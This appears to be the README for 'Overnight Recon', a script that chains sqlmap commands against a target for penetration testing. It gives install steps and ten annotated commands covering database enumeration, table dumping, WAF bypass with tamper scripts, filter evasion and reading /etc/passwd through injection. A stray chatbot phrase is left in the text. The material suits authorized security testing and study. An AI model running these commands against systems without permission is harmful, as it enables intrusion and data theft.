

**Overnight Recon** is an automated reconnaissance tool designed for security professionals and researchers. It executes a series of predefined SQL injection commands against a target to identify potential vulnerabilities. The tool operates in verbose mode, logging all activities into a log file for detailed analysis.

### Features
- Executes SQL injection commands against a specified target.
- Supports verbose mode with comprehensive logging.
- Logs all activities into `logsql.txt` for review.
- Customizable for additional tools and commands.

### License
This tool is licensed under the **GNU General Public License (GPL) v3.0**. You are free to modify and redistribute the code, provided that any derivative works are also open source under the GPL license.

### Installation

#### On Linux

1. **Install Required Packages:**
   Ensure you have Python 3 and pip installed. You can install them using your package manager if they are not already installed.

   ```
   sudo apt update
   sudo apt install python3 python3-pip
   ```

2. **Install SQLMap:**
   SQLMap is a popular SQL injection tool used for detecting and exploiting SQL injection flaws. Install it via pip.

   ```
   sudo pip3 install sqlmap
   ```

3. **Download and Set Up Overnight Recon:**
   Clone the repository and make the script executable.

   ```
   git clone https://github.com/IlumCI/Overnight-Recon.git
   cd Overnight-Recon
   chmod +x ovrecon.sh
   ```

4. **Run the Script:**
   You can now run the script by executing:

   ```
   ./ovrecon.sh
   ```

#### On Windows (via WSL)

1. **Install WSL (Windows Subsystem for Linux):**
   Follow the instructions [here](https://docs.microsoft.com/en-us/windows/wsl/install) to install WSL and a Linux distribution of your choice.

2. **Install Required Packages in WSL:**
   Open your WSL terminal and install Python 3 and pip.

   ```
   sudo apt update
   sudo apt install python3 python3-pip
   ```

3. **Install SQLMap:**
   Install SQLMap using pip.

   ```
   sudo pip3 install sqlmap
   ```

4. **Download and Set Up Overnight Recon:**
   Clone the repository and make the script executable.

   ```
   git clone https://github.com/IlumCI/Overnight-Recon.git
   cd Overnight-Recon
   chmod +x ovrecon.sh
   ```

5. **Run the Script:**
   Execute the script with:

   ```
   ./ovrecon.sh
   ```

Certainly! Below is a section that explains what each command in the script does to the target. This will help users understand the purpose and function of each command when using the tool.

---

## Command Breakdown

This section provides an explanation of what each SQLmap command in the `ovrecon.sh` script does to the target. Understanding these actions is crucial for effective testing and exploitation.

### 1. Basic SQL Injection Test
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -v 6
```
- **Purpose**: This command initiates a basic SQL injection test on the target URL with the given POST data.
- **Details**:
  - `--batch`: Automatically accepts default options to avoid interactive prompts.
  - `--level=3`: Specifies the intensity of tests, with level 3 performing more thorough checks.
  - `--risk=2`: Focuses on riskier tests that could potentially alter the database but are more likely to uncover vulnerabilities.
  - `-v 6`: Provides the most detailed output, showing all HTTP requests and responses.

### 2. Enumerate the Databases
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --dbs -v 6
```
- **Purpose**: This command attempts to list all the databases on the target server.
- **Details**:
  - `--dbs`: Tells SQLmap to enumerate databases if an SQL injection vulnerability is found.

### 3. Dump Data from a Specific Table
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -D '$DATABASE_NAME' -T '$TABLE_NAME' --dump -v 6
```
- **Purpose**: Extracts data from a specific table in a specified database.
- **Details**:
  - `-D '$DATABASE_NAME'`: Specifies the database to target.
  - `-T '$TABLE_NAME'`: Specifies the table within the database.
  - `--dump`: Dumps all data from the specified table.

### 4. Identify Injection Points
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=5 --risk=3 --identify-waf -v 6
```
- **Purpose**: Identifies specific points in the target where SQL injection can occur and checks for Web Application Firewalls (WAFs).
- **Details**:
  - `--level=5`: Performs the most extensive and thorough tests.
  - `--risk=3`: Executes highly risky tests that could have severe impacts on the database.
  - `--identify-waf`: Detects the presence of WAFs that could block SQL injection attempts.

### 5. Use Tamper Scripts to Bypass WAF
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --tamper='$TAMPER_SCRIPTS' -v 6
```
- **Purpose**: Attempts to bypass WAF protections by modifying the SQL payload using tamper scripts.
- **Details**:
  - `--tamper='$TAMPER_SCRIPTS'`: Uses the specified tamper scripts (`space2comment`, `randomcase`) to alter the SQL injection payload in ways that may bypass WAF filters.

### 6. Test for Injection via HTTP Headers
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --headers='X-Forwarded-For: 127.0.0.1' -v 6
```
- **Purpose**: Tests for SQL injection vulnerabilities via HTTP headers.
- **Details**:
  - `--headers='X-Forwarded-For: 127.0.0.1'`: Adds a custom HTTP header to the request, which can sometimes bypass certain security mechanisms or reveal additional vulnerabilities.

### 7. Use Cookies for Injection Testing
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --cookie='session=abc123' -v 6
```
- **Purpose**: Explores SQL injection vulnerabilities by injecting into the cookie field.
- **Details**:
  - `--cookie='session=abc123'`: Uses a custom cookie, simulating an authenticated session to check if the application is vulnerable when cookies are manipulated.

### 8. Use Different HTTP Methods
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --method=POST -v 6
```
- **Purpose**: Tests for SQL injection vulnerabilities using different HTTP methods.
- **Details**:
  - `--method=POST`: Specifies the HTTP method to be used in the request, which can affect how the server processes the input and reveal different vulnerabilities.

### 9. Randomize User-Agent and Referer
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --random-agent -v 6
```
- **Purpose**: Randomizes the `User-Agent` and `Referer` headers to evade basic security measures and test for SQL injection vulnerabilities under different conditions.
- **Details**:
  - `--random-agent`: Randomizes the `User-Agent` header to simulate different browsers or devices, which can bypass some security filters.

### 10. Check for SQL Injection via Files and Payloads
```bash
sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --file-read=/etc/passwd -v 6
```
- **Purpose**: Attempts to exploit SQL injection to read sensitive files from the server.
- **Details**:
  - `--file-read=/etc/passwd`: Attempts to read the `/etc/passwd` file on Unix-like systems, which contains user account information.

---

   
---

## For Educational Purposes

**Overnight Recon** is designed strictly for educational and research purposes. It is intended to help security professionals understand how automated reconnaissance tools can be used in penetration testing and security assessments.

**Disclaimer:**
- **Legal Use Only**: Use this tool only on systems you own or have explicit permission to test. Unauthorized use against systems without permission is illegal and unethical.
- **Educational Intent**: This tool is provided for learning purposes to understand security concepts and practices. The creator of this tool disclaims any responsibility for misuse or illegal activities.

**Guidance for Use:**
- **Learning**: Utilize this tool to learn about SQL injection and automated testing.
- **Testing**: Test your own systems or participate in ethical hacking environments where you have consent.
- **Improvement**: Modify and enhance the tool as part of your learning process, but always ensure you comply with legal and ethical standards.

---
